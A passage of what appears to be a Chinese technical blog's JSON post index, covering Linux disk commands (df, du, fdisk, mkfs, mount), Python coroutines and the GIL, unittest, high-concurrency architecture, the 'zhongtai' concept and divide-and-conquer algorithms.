maxs[i][j] = 0; else if (j &lt; A[i - 1]) &#123; maxs[i][j] = maxs[i - 1][j]; &#125; else &#123;// j&gt;=A[i-1] maxs[i][j] = Math.max(V[i - 1] + maxs[i - 1][j - A[i - 1]], maxs[i - 1][j]); &#125; &#125; &#125; return maxs[A.length][m];&#125; 完全背包每个物品能取无穷次 多重背包每一个物品都只有有限数量","comments":true,"categories":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/categories/Algorithm/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://swsmile.info/tags/Algorithm/"}]},{"title":"【Linxu】磁盘管理","date":"2019-08-08T13:53:55.000Z","path":"2019/08/08/【Linxu】磁盘管理/","text":"dfdf命令参数功能：检查文件系统的磁盘空间占用情况。可以利用该命令来获取硬盘被占用了多少空间，目前还剩下多少空间等信息。 语法： 1$ df [-ahikHTm] [目录或文件名] 选项与参数： -a ：列出所有的文件系统，包括系统特有的 /proc 等文件系统； -k ：以 KBytes 的容量显示各文件系统； -m ：以 MBytes 的容量显示各文件系统； -h ：以人们较易阅读的 GBytes, MBytes, KBytes 等格式自行显示； -H ：以 M=1000K 取代 M=1024K 的进位方式； -T ：显示文件系统类型, 连同该 partition 的 filesystem 名称 (例如 ext3) 也列出； -i ：不用硬盘容量，而以 inode 的数量来显示 列出系统内所有的文件系统123456$ dfFilesystem 1K-blocks Used Available Use% Mounted on/dev/hdc2 9920624 3823112 5585444 41% //dev/hdc3 4956316 141376 4559108 4% /home/dev/hdc1 101086 11126 84741 12% /boottmpfs 371332 0 371332 0% /dev/shm 在 Linux 底下如果 df 没有加任何选项，那么默认会将系统内所有的 (不含特殊内存内的文件系统与 swap) 都以 1 Kbytes 的容量来列出来！ 将容量结果以易读的容量格式显示出来123456$ df -hFilesystem Size Used Avail Use% Mounted on/dev/hdc2 9.5G 3.7G 5.4G 41% //dev/hdc3 4.8G 139M 4.4G 4% /home/dev/hdc1 99M 11M 83M 12% /boottmpfs 363M 0 363M 0% /dev/shm 将系统内的所有特殊文件格式及名称都列出来1234567891011$ df -aTFilesystem Type 1K-blocks Used Available Use% Mounted on/dev/hdc2 ext3 9920624 3823112 5585444 41% /proc proc 0 0 0 - /procsysfs sysfs 0 0 0 - /sysdevpts devpts 0 0 0 - /dev/pts/dev/hdc3 ext3 4956316 141376 4559108 4% /home/dev/hdc1 ext3 101086 11126 84741 12% /boottmpfs tmpfs 371332 0 371332 0% /dev/shmnone binfmt_misc 0 0 0 - /proc/sys/fs/binfmt_miscsunrpc rpc_pipefs 0 0 0 - /var/lib/nfs/rpc_pipefs 将 /etc 底下的可用的磁盘容量以易读的容量格式显示123$ df -h /etcFilesystem Size Used Avail Use% Mounted on/dev/hdc2 9.5G 3.7G 5.4G 41% / duLinux du命令也是查看使用空间的，但是与df命令不同的是Linux du命令是对文件和目录磁盘使用的空间的查看。 语法： 1$ du [-ahskm] 文件或目录名称 选项与参数： -a ：列出所有的文件与目录容量，因为默认仅统计目录底下的文件量而已。 -h ：以人们较易读的容量格式 (G/M) 显示； -s ：列出总量而已，而不列出每个各别的目录占用容量； -S ：不包括子目录下的总计，与 -s 有点差别。 -k ：以 KBytes 列出容量显示； -m ：以 MBytes 列出容量显示； 列出目前目录下的所有文件容量123456$ du8 ./test4 &lt;==每个目录都会列出来8 ./test2....中间省略....12 ./.gconfd &lt;==包括隐藏文件的目录220 . &lt;==这个目录(.)所占用的总量 直接输入 du 没有加任何选项时，则 du 会分析当前所在目录的文件与目录所占用的硬盘空间。 将文件的容量也列出来12345678$ du -a12 ./install.log.syslog &lt;==有文件的列表了8 ./.bash_logout8 ./test48 ./test2....中间省略....12 ./.gconfd220 . 检查根目录底下每个目录所占用的容量123456789$ du -sm /*7 /bin6 /boot.....中间省略....0 /proc.....中间省略....1 /tmp3859 /usr &lt;==系统初期最大就是他了啦！77 /var 通配符 * 来代表每个目录。 与 df 不一样的是，du 这个命令其实会直接到文件系统内去搜寻所有的文件数据。 fdiskfdisk 是 Linux 的磁盘分区表操作工具。 语法： 1$ fdisk [-l] 装置名称 选项与参数： -l ：输出后面接的装置所有的分区内容。若仅有 fdisk -l 时， 则系统将会把整个系统内能够搜寻到的装置的分区均列出来。 列出所有分区信息12345678910111213141516171819202122$ fdisk -lDisk /dev/xvda: 21.5 GB, 21474836480 bytes255 heads, 63 sectors/track, 2610 cylindersUnits = cylinders of 16065 * 512 = 8225280 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x00000000 Device Boot Start End Blocks Id System/dev/xvda1 * 1 2550 20480000 83 Linux/dev/xvda2 2550 2611 490496 82 Linux swap / SolarisDisk /dev/xvdb: 21.5 GB, 21474836480 bytes255 heads, 63 sectors/track, 2610 cylindersUnits = cylinders of 16065 * 512 = 8225280 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x56f40944 Device Boot Start End Blocks Id System/dev/xvdb2 1 2610 20964793+ 83 Linux mkfs - 磁盘格式化磁盘分割完毕后自然就是要进行文件系统的格式化，格式化的命令非常的简单，使用 mkfs（make filesystem） 命令。 语法： 1$ mkfs [-t 文件系统格式] 装置文件名 选项与参数： -t ：可以接文件系统格式，例如 ext3, ext2, vfat 等(系统有支持才会生效) 查看 mkfs 支持的文件格式12$ mkfs[tab][tab]mkfs mkfs.cramfs mkfs.ext2 mkfs.ext3 mkfs.msdos mkfs.vfat 按下两个[tab]，会发现 mkfs 支持的文件格式如上所示。 将分区 /dev/hdc6（可指定你自己的分区） 格式化为 ext3 文件系统1234567891011121314151617181920212223$ mkfs -t ext3 /dev/hdc6mke2fs 1.39 (29-May-2006)Filesystem label= &lt;==这里指的是分割槽的名称(label)OS type: LinuxBlock size=4096 (log=2) &lt;==block 的大小配置为 4K Fragment size=4096 (log=2)251392 inodes, 502023 blocks &lt;==由此配置决定的inode/block数量25101 blocks (5.00%) reserved for the super userFirst data block=0Maximum filesystem blocks=51589939216 block groups32768 blocks per group, 32768 fragments per group15712 inodes per groupSuperblock backups stored on blocks: 32768, 98304, 163840, 229376, 294912Writing inode tables: doneCreating journal (8192 blocks): done &lt;==有日志记录Writing superblocks and filesystem accounting information: doneThis filesystem will be automatically checked every 34 mounts or180 days, whichever comes first. Use tune2fs -c or -i to override.# 这样就创建起来我们所需要的 Ext3 文件系统了！简单明了！ 磁盘挂载与卸除Linux 的磁盘挂载使用 mount 命令，卸载使用 umount 命令。 磁盘挂载语法： 1$ mount [-t 文件系统] [-L Label名] [-o 额外选项] [-n] 装置文件名 挂载点 实例 1用默认的方式，将刚刚创建的 /dev/hdc6 挂载到 /mnt/hdc6 上面！ 123456$ mkdir /mnt/hdc6$ mount /dev/hdc6 /mnt/hdc6$ dfFilesystem 1K-blocks Used Available Use% Mounted on.....中间省略...../dev/hdc6 1976312 42072 1833836 3% /mnt/hdc6 磁盘卸载命令 umount 语法： 1$ umount [-fn] 装置文件名或挂载点 选项与参数： -f ：强制卸除！可用在类似网络文件系统 (NFS) 无法读取到的情况下； -n ：不升级 /etc/mtab 情况下卸除。 卸载/dev/hdc6 1$ umount /dev/hdc6 Reference Linux 磁盘管理 - https://www.runoob.com/linux/linux-filesystem.html","comments":true,"categories":[{"name":"Linxu","slug":"Linxu","permalink":"http://swsmile.info/categories/Linxu/"}],"tags":[{"name":"Linxu","slug":"Linxu","permalink":"http://swsmile.info/tags/Linxu/"}]},{"title":"【Python】协程（Coroutine）","date":"2019-08-08T13:34:05.000Z","path":"2019/08/08/【Python】线程-协程/","text":"协程（Coroutine）协程，又称微线程，纤程。英文名Coroutine，这其实是corporate routine的缩写，直接翻译为协同的例程。 协程的概念很早就提出来了，但直到最近几年才在某些语言（如Lua）中得到广泛应用。 子程序，或者称为函数，在所有语言中都是层级调用，比如A调用B，B在执行过程中又调用了C，C执行完毕返回，B执行完毕返回，最后是A执行完毕。 所以子程序调用是通过栈实现的，一个线程就是执行一个子程序。 子程序调用总是一个入口，一次返回，调用顺序是明确的。而协程的调用和子程序不同。 协程看上去也是子程序，但执行过程中，在子程序内部可中断，然后转而执行别的子程序，在适当的时候再返回来接着执行。 注意，在一个子程序中中断，去执行其他子程序，不是函数调用，有点类似CPU的中断。比如子程序A、B： 123456789def A(): print '1' print '2' print '3'def B(): print 'x' print 'y' print 'z' 假设由协程执行，在执行A的过程中，可以随时中断，去执行B，B也可能在执行过程中中断再去执行A，结果可能是： 12345612xy3z 但是在A中是没有调用B的，所以协程的调用比函数调用理解起来要难一些。 看起来A、B的执行有点像多线程，但协程的特点在于是一个线程执行，那和多线程比，协程有何优势？ 最大的优势就是协程极高的执行效率。因为子程序切换不是线程切换，而是由程序自身控制，因此，没有线程切换的开销，和多线程比，线程数量越多，协程的性能优势就越明显。 第二大优势就是不需要多线程的锁机制，因为只有一个线程，也不存在同时写变量冲突，在协程中控制共享资源不加锁，只需要判断状态就好了，所以执行效率比多线程高很多。 因为协程是一个线程执行，那怎么利用多核CPU呢？最简单的方法是多进程+协程，既充分利用多核，又充分发挥协程的高效率，可获得极高的性能。 总结来说，协程由于由程序主动控制切换，没有线程切换的开销，所以执行效率极高。对于I/O密集型任务非常适用，如果是CPU密集型，推荐多进程+协程的方式。 进程和协程下面对比一下进程和协程的相同点和不同点： 相同点：我们都可以把他们看做是一种执行流，执行流可以挂起，并且后面可以在你挂起的地方恢复执行，这实际上都可以看做是continuation,关于这个我们可以通过在linux上运行一个hello程序来理解： shell进程和hello进程： 开始，shell进程在运行，等待命令行的输入 执行hello程序，shell通过系统调用来执行我们的请求，这个时候系统调用会讲控制权传递给操作系统。操作系统保存shell进程的上下文，创建一个hello进程以及其上下文并将控制权给新的hello进程。 hello进程终止后，操作系统恢复shell进程的上下文，并将控制权传回给shell进程 shell进程继续等待下个命令的输入 当我们挂起一个执行流的时，我们要保存的东西： 栈， 其实在你切换前你的局部变量，以及要函数的调用都需要保存，否则都无法恢复 寄存器状态，这个其实用于当你的执行流恢复后要做什么 而寄存器和栈的结合就可以理解为上下文，上下文切换的理解：CPU看上去像是在并发的执行多个进程，这是通过处理器在进程之间切换来实现的，操作系统实现这种交错执行的机制称为上下文切换（context switch）。 操作系统保持跟踪进程运行所需的所有状态信息。这种状态，就是上下文。 在任何一个时刻，操作系统都只能执行一个进程代码，当操作系统决定把控制权从当前进程转移到某个新进程时，就会进行上下文切换，即保存当前进程的上下文，恢复新进程的上下文，然后将控制权传递到新进程，新进程就会从它上次停止的地方开始。 不同点： 执行流的调度者不同，进程是内核调度，而协程是在用户态调度，也就是说进程的上下文是在内核态保存恢复的，而协程是在用户态保存恢复的，很显然用户态的代价更低 进程会被强占，而协程不会，也就是说协程如果不主动让出CPU，那么其他的协程，就没有执行的机会。 对内存的占用不同，实际上协程可以只需要4K的栈就足够了，而进程占用的内存要大的多 从操作系统的角度讲，多协程的程序是单进程，单协程 线程和协程既然我们上面也说了，协程也被称为微线程，下面对比一下协程和线程： 线程之间需要上下文切换成本相对协程来说是比较高的，尤其在开启线程较多时，但协程的切换成本非常低。 同样的线程的切换更多的是靠操作系统来控制，而协程的执行由我们自己控制 我们通过下面的图更容易理解： 从上图可以看出，协程只是在单一的线程里不同的协程之间切换，其实和线程很像，线程是在一个进程下，不同的线程之间做切换，这也可能是协程称为微线程的原因吧 继续分析协程： 协程的支持在Python3.4之前，官方没有对协程的支持，存在一些三方库的实现，比如gevent和Tornado。3.4之后就内置了asyncio标准库，官方真正实现了协程这一特性。 因为协程是一个线程执行，那怎么利用多核CPU呢？最简单的方法是多进程+协程，既充分利用多核，又充分发挥协程的高效率，可获得极高的性能。 Python对协程的支持是通过generator实现的。 在generator中，我们不但可以通过for循环来迭代，还可以不断调用next()函数获取由yield语句返回的下一个值。 但是Python的yield不但可以返回一个值，它还可以接收调用者发出的参数。 生产者和消费者模型传统的生产者-消费者模型是一个线程写消息，一个线程取消息，通过锁机制控制队列和等待，但一不小心就可能死锁。 如果改用协程，生产者生产消息后，直接通过yield跳转到消费者开始执行，待消费者执行完毕后，切换回生产者继续生产，效率极高： 123456789101112131415161718192021def consumer(): r = '' while True: n = yield r if not n: return print('[CONSUMER] Consuming %s...' % n) r = '200 OK'def produce(c): c.send(None) n = 0 while n &lt; 5: n = n + 1 print('[PRODUCER] Producing %s...' % n) r = c.send(n) print('[PRODUCER] Consumer return: %s' % r) c.close()c = consumer()produce(c) 执行结果： 123456789101112131415[PRODUCER] Producing 1...[CONSUMER] Consuming 1...[PRODUCER] Consumer return: 200 OK[PRODUCER] Producing 2...[CONSUMER] Consuming 2...[PRODUCER] Consumer return: 200 OK[PRODUCER] Producing 3...[CONSUMER] Consuming 3...[PRODUCER] Consumer return: 200 OK[PRODUCER] Producing 4...[CONSUMER] Consuming 4...[PRODUCER] Consumer return: 200 OK[PRODUCER] Producing 5...[CONSUMER] Consuming 5...[PRODUCER] Consumer return: 200 OK 注意到consumer函数是一个generator，把一个consumer传入produce后： 首先调用c.send(None)启动生成器； 然后，一旦生产了东西，通过c.send(n)切换到consumer执行； consumer通过yield拿到消息，处理，又通过yield把结果传回； produce拿到consumer处理的结果，继续生产下一条消息； produce决定不生产了，通过c.close()关闭consumer，整个过程结束。 整个流程无锁，由一个线程执行，produce和consumer协作完成任务，所以称为“协程”，而非线程的抢占式多任务。 最后套用Donald Knuth的一句话总结协程的特点： “子程序就是协程的一种特例。” Reference 协程 - https://www.liaoxuefeng.com/wiki/897692888725344/923057403198272 理解Python的协程(Coroutine) - https://juejin.im/post/5c13245ee51d455fa5451f33 Python并发编程协程(Coroutine)之Gevent - https://www.cnblogs.com/zhaof/p/7536569.html","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】Python 的单线程","date":"2019-08-06T14:24:22.000Z","path":"2019/08/06/【Python】线程-Python的单线程/","text":"Python 中的伪多线程实验如果你不幸拥有一个多核CPU，你肯定在想，多核应该可以同时执行多个线程。 如果写一个死循环的话，会出现什么情况呢？ 打开Mac OS X的Activity Monitor，或者Windows的Task Manager，都可以监控某个进程的CPU使用率。 我们可以监控到一个死循环线程会100%占用一个CPU。 如果有两个死循环线程，在多核CPU中，可以监控到会占用200%的CPU，也就是占用两个CPU核心。 要想把N核CPU的核心全部跑满，就必须启动N个死循环线程。 实验 1试试用Python写个死循环： 12345678910import threading, multiprocessingdef loop(): x = 0 while True: x = x ^ 1for i in range(multiprocessing.cpu_count()): t = threading.Thread(target=loop) t.start() 启动与CPU核心数量相同的N个线程，在4核CPU上可以监控到CPU占用率仅有102%，也就是仅使用了一核。 实验 2而如果我们变成进程呢？ 我们改一下代码： 12345678910111213141516171819#coding=utf-8from multiprocessing import Poolfrom threading import Threadfrom multiprocessing import Processdef loop(): while True: passif __name__ == '__main__': for i in range(3): t = Process(target=loop) t.start() while True: pass 结果 CPU 利用率直接飙到了100%，说明进程是可以利用多核的！ 实验 3为了验证这是Python中的GIL搞得鬼，我试着用Java写相同的代码，开启线程，我们观察一下： 123456789101112131415161718public class TestThread &#123; public static void main(String[] args) &#123; for (int i = 0; i &lt; 3; i++) &#123; new Thread(new Runnable() &#123; @Override public void run() &#123; while (true) &#123; &#125; &#125; &#125;).start(); &#125; while(true)&#123; &#125; &#125;&#125; 由此可见，Java中的多线程是可以利用多核的，这是真正的多线程！而Python中的多线程只能利用单核，这是假的多线程！ 难道就如此？我们没有办法在Python中利用多核？当然可以！刚才的多进程算是一种解决方案，还有一种就是调用C语言的链接库。对所有面向I/O的（会调用内建的操作系统C代码的）程序来说，GIL会在这个I/O调用之前被释放，以允许其他线程在这个线程等待I/O的时候运行。我们可以把一些计算密集型任务用C语言编写，然后把.so链接库内容加载到Python中，因为执行C代码，GIL锁会释放，这样一来，就可以做到每个核都跑一个线程的目的！ 可能有的小伙伴不太理解什么是计算密集型任务，什么是I/O密集型任务？ 计算密集型任务的特点是要进行大量的计算，消耗CPU资源，比如计算圆周率、对视频进行高清解码等等，全靠CPU的运算能力。这种计算密集型任务虽然也可以用多任务完成，但是任务越多，花在任务切换的时间就越多，CPU执行任务的效率就越低，所以，要最高效地利用CPU，计算密集型任务同时进行的数量应当等于CPU的核心数。 计算密集型任务由于主要消耗CPU资源，因此，代码运行效率至关重要。Python这样的脚本语言运行效率很低，完全不适合计算密集型任务。对于计算密集型任务，最好用C语言编写。 第二种任务的类型是IO密集型，涉及到网络、磁盘IO的任务都是IO密集型任务，这类任务的特点是CPU消耗很少，任务的大部分时间都在等待IO操作完成（因为IO的速度远远低于CPU和内存的速度）。对于IO密集型任务，任务越多，CPU效率越高，但也有一个限度。常见的大部分任务都是IO密集型任务，比如Web应用。 IO密集型任务执行期间，99%的时间都花在I/O上，花在CPU上的时间很少，因此，用运行速度极快的C语言替换用Python这样运行速度极低的脚本语言，完全无法提升运行效率。对于I/O密集型任务，最合适的语言就是开发效率最高（代码量最少）的语言，脚本语言是首选，C语言最差。 综上，Python多线程相当于单核多线程，多线程有两个好处：CPU并行，IO并行，单核多线程相当于自断一臂。所以，在Python中，可以使用多线程，但不要指望能有效利用多核。如果一定要通过多线程利用多核，那只能通过C扩展来实现，不过这样就失去了Python简单易用的特点。不过，也不用过于担心，Python虽然不能利用多线程实现多核任务，但可以通过多进程实现多核任务。多个Python进程有各自独立的GIL锁，互不影响。 分析GIL是Python解释器设计的历史遗留问题，通常我们用的解释器是官方实现的CPython，要真正利用多核，除非重写一个不带GIL的解释器。 因为，任何Python线程执行前，必须先获得GIL锁，然后，每执行100条字节码，解释器就自动释放GIL锁，让别的线程有机会执行。这个GIL全局锁实际上把所有线程的执行代码都给上了锁，所以，多线程在Python中只能交替执行，即使100个线程跑在100核CPU上，也只能用到1个核。 所以，在Python中，可以使用多线程，但不要指望能有效利用多核。如果一定要通过多线程利用多核，那只能通过C扩展来实现，不过这样就失去了Python简单易用的特点。 不过，也不用过于担心，Python虽然不能利用多线程实现多核任务，但可以通过多进程实现多核任务。多个Python进程有各自独立的GIL锁，互不影响。 全局解释器锁（Global Interpreter Lock，GIL）Python代码的执行由Python虚拟机（解释器）来控制。Python在设计之初就考虑要在主循环中，同时只有一个线程在执行，就像单CPU的系统中运行多个进程那样，内存中可以存放多个程序，但任意时刻，只有一个程序在CPU中运行。同样地，虽然Python解释器可以运行多个线程，只有一个线程在解释器中运行。因为，任何Python线程执行前，必须先获得GIL锁。 对Python虚拟机的访问由全局解释器锁（GIL）来控制，正是这个锁能保证同时只有一个线程在运行。在多线程环境中，Python虚拟机按照以下方式执行： 1.设置GIL。 2.切换到一个线程去执行。 3.运行。 4.把线程设置为睡眠状态。 5.解锁GIL。 6.再次重复以上步骤。 对所有面向I/O的（会调用内建的操作系统C代码的）程序来说，GIL会在这个I/O调用之前被释放，以允许其他线程在这个线程等待I/O的时候运行。如果某线程并未使用很多I/O操作，它会在自己的时间片内一直占用处理器和GIL。也就是说，I/O密集型的Python程序比计算密集型的Python程序更能充分利用多线程的好处。 我们都知道，比方我有一个4核的CPU，那么这样一来，在单位时间内每个核只能跑一个线程，然后时间片轮转切换。但是Python不一样，它不管你有几个核，单位时间多个核只能跑一个线程，然后时间片轮转。看起来很不可思议？但是这就是GIL搞的鬼。任何Python线程执行前，必须先获得GIL锁，然后，每执行100条字节码，解释器就自动释放GIL锁，让别的线程有机会执行。这个GIL全局锁实际上把所有线程的执行代码都给上了锁，所以，多线程在Python中只能交替执行，即使100个线程跑在100核CPU上，也只能用到1个核。通常我们用的解释器是官方实现的CPython，要真正利用多核，除非重写一个不带GIL的解释器。 效率对比 threading &amp; multiprocessing创建多进程 multiprocessing首先import multiprocessing，并定义要实现的job()，同时为了容易比较，我们将计算的次数增加到1000000次。 1234567891011121314import multiprocessing as mpdef job(): res = 0 for i in range(1000000): res += i + i**2 + i**3def multicore(): p1 = mp.Process(target=job) p2 = mp.Process(target=job) p1.start() p2.start() p1.join() p2.join() 创建多线程 multithread接下来创建多线程程序，创建多线程和多进程有很多相似的地方。首先import threading然后定义multithread()完成同样的任务 123456789import threading as tddef multithread(): t1 = td.Thread(target=job) t2 = td.Thread(target=job) t1.start() t2.start() t1.join() t2.join() 创建单线程最后我们定义只在一个线程中执行计算的函数。 12345def normal(): res = 0 for _ in range(2): job() print('normal:', res) 运行时间最后，为了对比各函数运行时间，我们需要import time， 然后依次运行定义好函数： 123456789101112import timeif __name__ == '__main__': st = time.time() normal() st1 = time.time() print('normal time:', st1 - st) multithread() st2 = time.time() print('multithread time:', st2 - st1) multicore() print('multicore time:', time.time() - st2) 大功告成，下面我们来看下实际运行对比。 结果对比123456789&quot;&quot;&quot;# range(1000000)(&apos;normal:&apos;, 499999666667166666000000L)(&apos;normal time:&apos;, 1.1306169033050537)(&apos;thread:&apos;, 499999666667166666000000L)(&apos;multithread time:&apos;, 1.3054230213165283)(&apos;multicore:&apos;, 499999666667166666000000L)(&apos;multicore time:&apos;, 0.646507978439331)&quot;&quot;&quot; 单线程/多线程/多进程的运行时间分别是1.13，1.3和0.64秒。 我们发现： 多进程最快，这说明在开启多个进程后，执行计算的过程可以充分利用 CPU 的多个核。 而开启多线程比只用单线程还慢，这其实印证了前面 GIL 的分析，即 Python 的多线程是伪多线程，开启的多个线程，在任意时刻只有一个线程在运行。而比单线程还慢是因为不断的切换线程还需要耗费额外的资源。 我们将运算次数加十倍，再来看看三种方法的运行时间： 123456789&quot;&quot;&quot;# range(10000000)(&apos;normal:&apos;, 4999999666666716666660000000L)(&apos;normal time:&apos;, 40.041773080825806)(&apos;thread:&apos;, 4999999666666716666660000000L)(&apos;multithread time:&apos;, 41.777158975601196)(&apos;multicore:&apos;, 4999999666666716666660000000L)(&apos;multicore time:&apos;, 22.4337899684906)&quot;&quot;&quot; 这次运行时间依然是 多进程 &lt; 普通 &lt; 多线程，由此我们可以清晰地看出哪种方法更有效率。 协程Python 中的多线程不能真正的利用多核，不能解决 CPU bound 的问题，但是在一些 IO bound 的程序上却可以有很好的提升。 但是目前的情况是 我们有了协程啊，在 2.x 系列里我们可以使用 gevent 啊，在 3.x 系列的标准库里又有了 asyncio。IO bound 的问题完全可以用协程解决。而且我们可以自主的控制协程的调度了。为什么还要使用由 OS 调度的不太可控的线程呢？ 所以我认为线程在 Python 里就是个鸡肋。尤其实在 3.x 系列里。 Reference 为什么有人说 Python 的多线程是鸡肋呢？ - https://www.zhihu.com/question/23474039 Python 多线程 - https://www.runoob.com/python/python-multithreading.html 多线程 - https://www.liaoxuefeng.com/wiki/1016959663602400/1017629247922688 效率对比 threading &amp; multiprocessing - https://morvanzhou.github.io/tutorials/python-basic/multiprocessing/4-comparison/","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】Python 几种常用的测试框架","date":"2019-08-06T14:16:56.000Z","path":"2019/08/06/【Python】Python几种常用的测试框架/","text":"常见的测试框架1 Unittest unittest是Python内置的标准类库。它的API跟Java的JUnit、.net的NUnit，C++的CppUnit很相似。 通过继承unittest.TestCase来创建一个测试用例。 具体请参考文档。 举个例： 12345678import unittestdef fun(x): return x + 1class MyTest(unittest.TestCase): def test(self): self.assertEqual(fun(3), 4) Reference Python几种常用的测试框架 - https://www.cnblogs.com/liaofeifight/p/5145402.html","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Architecture】高并发","date":"2019-08-06T03:59:30.000Z","path":"2019/08/06/【Architecture】高并发/","text":"实现高并发的思路数据库数据库的分库分表 数据库读写分离-主从复制 -&gt;增加读性能 双主复制 增加 Redis 负载均衡 DNS 负载均衡 反向代理负载均衡 IP负载均衡 直接路由 静态资源动态静态资源分离，静态资源使用 CDN 加速。 消息队列镜像集群模式创建的queue无论元数据还是queue里的消息都会存在于多个实例上， 每次写消息到queue的时候，都会自动把消息到多个实例的queue里进行消息同步。 这样的话任何一个机器宕机了别的实例都可以用提供服务，这样就做到了真正的高可用了。 异步（提高并行）减少响应所需时间 削峰消息队列具有很好的削峰作用的功能——即通过异步处理，将短时间高并发产生的事务消息存储在消息队列中，从而削平高峰期的并发事务。 TODO高可用 https://coolshell.cn/articles/17459.html高并发 https://juejin.im/post/5c45aaee6fb9a049e6609115 https://mp.weixin.qq.com/s?__biz=MzU0OTk3ODQ3Ng==&amp;mid=2247484026&amp;idx=1&amp;sn=32ebf21e0285d3947192d89fbe6a8cb7&amp;chksm=fba6ea79ccd1636f8f9088f448b4a3942de57bf97f582de2feb93da06e4ddfca68a5a88befe0&amp;scene=21&amp;token=41464945&amp;lang=zh_CN#wechat_redirect https://juejin.im/post/5c4732f56fb9a049e413083d Reference 面试最让你手足无措的一个问题：你的系统如何支撑高并发？【石杉的架构笔记】 - https://juejin.im/post/5c45aaee6fb9a049e6609115","comments":true,"categories":[{"name":"Architecture","slug":"Architecture","permalink":"http://swsmile.info/categories/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"http://swsmile.info/tags/Architecture/"}]},{"title":"【Architecture】中台概念","date":"2019-08-06T03:52:12.000Z","path":"2019/08/06/【Architecture】中台/","text":"中台的企业级首先，中台一定是企业级的，这里的企业级不是说难度而是指范围。企业级也不一定就是一个企业的范围，甚至可以是跨企业，例如现在同样火爆的“生态”的概念。 当做中台建设的时候，一定是跳出单条业务线、站在企业整体视角来审视业务全景，寻找可复用的能力进行沉淀，从而希望通过能力的复用一方面消除数据孤岛、业务孤岛，一方面支撑企业级规模化创新，助力企业变革，孕育生态。 所以虽然中台的建设过程虽然可以自下而上，以点及面。但驱动力一定是自上而下的，从全局视角出发的，并且需要一定的顶层设计。这也解释了为什么在企业中推动中台建设的往往都是跨业务部门，例如CIO级别领导或是企业的战略规划部门，因为只有这些横跨多条业务线的角色和组织，才会经常去反思与推动企业级的能力复用问题。 这一点也引出了中台建设的一个关键难点，就是组织架构的调整和演进以及利益的重新分配是技术所不能解决的，也是中台建设的最强阻力， 中台的能力提到中台，最常听到的一个词就是「能力」。可能是因为能力这个词足够简单，又有着足够的包容度与宽度。 企业的能力可能包含多个维度，常见的例如计算能力，技术能力，业务能力，数据能力，AI能力，运营能力，研发能力……其中大部分的能力还可以继续细化和二次展开，从而形成一张多维度的企业能力网。 可以说，中台就是企业所有可以被「多前台产品团队」复用能力的载体。 Reference 白话中台战略：中台是个什么鬼? - https://insights.thoughtworks.cn/what-is-zhongtai/ 中台的定义 - https://zhuanlan.zhihu.com/p/61405069 《企业IT架构转型之道：阿里巴巴中台战略思想与架构实战》","comments":true,"categories":[{"name":"Architecture","slug":"Architecture","permalink":"http://swsmile.info/categories/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"http://swsmile.info/tags/Architecture/"}]},{"title":"【Algorithm】算法思想 - 分治算法（Divide and Conquer）","date":"2019-08-05T14:16:57.000Z","path":"2019/08/05/【Algorithm】算法思想-分治/","text":"分治算法基本概念在计算机科学中，分治法是一种很重要的算法。字面上的解释是“分而治之”，就是把一个复杂的问题分成两个或更多的相同或相似的子问题，再把子问题分成更小的子问题……直到最后子问题可以简单的直接求解，原问题的解即子问题的解的合并。这个技巧是很多高效算法的基础，如排序算法(快速排序，归并排序)，傅立叶变换(快速傅立叶变换)…… 任何一个可以用计算机求解的问题所需的计算时间都与其规模有关。问题的规模越小，越容易直接求解，解题所需的计算时间也越少。例如，对于n个元素的排序问题，当n=1时，不需任何计算。n=2时，只要作一次比较即可排好序。n=3时只要作3次比较即可，…。而当n较大时，问题就不那么容易处理了。要想直接解决一个规模较大的问题，有时是相当困难的。 基本思想及策略分治法的设计思想是：将一个难以直接解决的大问题，分割成一些规模较小的相同问题，以便各个击破，分而治之。 分治策略是：对于一个规模为n的问题，若该问题可以容易地解决（比如说规模n较小）则直接解决，否则将其分解为k个规模较小的子问题，这些子问题互相独立且与原问题形式相同，递归地解这些子问题，然后将各子问题的解合并得到原问题的解。这种算法设计策略叫做分治法。 如果原问题可分割成k个子问题，1&lt;k≤n，且这些子问题都可解并可利用这些子问题的解求出原问题的解，那么这种分治法就是可行的。由分治法产生的子问题往往是原问题的较小模式，这就为使用递归技术提供了方便。在这种情况下，反复应用分治手段，可以使子问题与原问题类型一致而其规模却不断缩小，最终使子问题缩小到很容易直接求出其解。这自然导致递归过程的产生。分治与递归像一对孪生兄弟，经常同时应用在算法设计之中，并由此产生许多高效算法。 分治法适用的情况分治法所能解决的问题一般具有以下几个特征： 该问题的规模缩小到一定的程度就可以容易地解决 该问题可以分解为若干个规模较小的相同问题，即该问题具有最优子结构性质。 利用该问题分解出的子问题的解可以合并为该问题的解； 该问题所分解出的各个子问题是相互独立的，即子问题之间不包含公共的子子问题。 第一条特征是绝大多数问题都可以满足的，因为问题的计算复杂性一般是随着问题规模的增加而增加； 第二条特征是应用分治法的前提它也是大多数问题可以满足的，此特征反映了递归思想的应用；、 第三条特征是关键，能否利用分治法完全取决于问题是否具有第三条特征，如果具备了第一条和第二条特征，而不具备第三条特征，则可以考虑用贪心法或动态规划法。 第四条特征涉及到分治法的效率，如果各子问题是不独立的则分治法要做许多不必要的工作，重复地解公共的子问题，此时虽然可用分治法，但一般用动态规划法较好。 分治法的基本步骤分治法在每一层递归上都有三个步骤： step1 分解：将原问题分解为若干个规模较小，相互独立，与原问题形式相同的子问题； step2 解决：若子问题规模较小而容易被解决则直接解，否则递归地解各个子问题 step3 合并：将各个子问题的解合并为原问题的解。 可使用分治法求解的一些经典问题 二分搜索 Lintcode - 97 Maximum 